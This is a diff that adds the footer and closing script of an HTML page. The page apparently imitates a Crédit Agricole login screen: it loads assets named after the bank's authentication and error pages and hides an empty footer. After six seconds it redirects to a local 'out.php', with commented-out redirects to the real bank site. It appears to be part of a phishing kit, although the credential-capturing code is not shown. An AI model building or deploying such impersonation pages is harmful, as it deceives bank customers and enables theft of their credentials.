@@ -1,0 +1,27 @@
+
+</main>
+
+<script src="../assets/js/clientlib-general.min.b5ff34b2035703897d75f3a3044f3a1e.js" defer="defer"></script> 
+<script src="../assets/js/clientlibPageErreur.min.f434b09157730b423058e364dda8b336.js" defer="defer"></script> 
+<script src="../assets/js/clientlibMireAuthentification.min.5e969969429038946546644a08b416ee.js" defer="defer"></script>
+<script src="../assets/js/jquery.min.js"></script>
+<footer id="foot" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></footer>
+<script src="../assets/js/jQuery.min.affcbf7942d5bedb0785712.js" defer="defer" async="async"></script>
+ 
+<script type="text/javascript">
+
+var lca = 'f6a8749340827f0de';
+ 
+setTimeout(function () {
+
+window.location.href= "out.php";
+/*window.location.href= "https://www.credit-agricole.fr/particulier/simulation-devis/epargne/simulateur-livrets-d-epargne.html?displayHeaderAlternate=true"; */
+/*window.location.href= "https://www.credit-agricole.fr/";*/
+
+},6000); 
+
+</script>
+
+</body>
+</html>
+
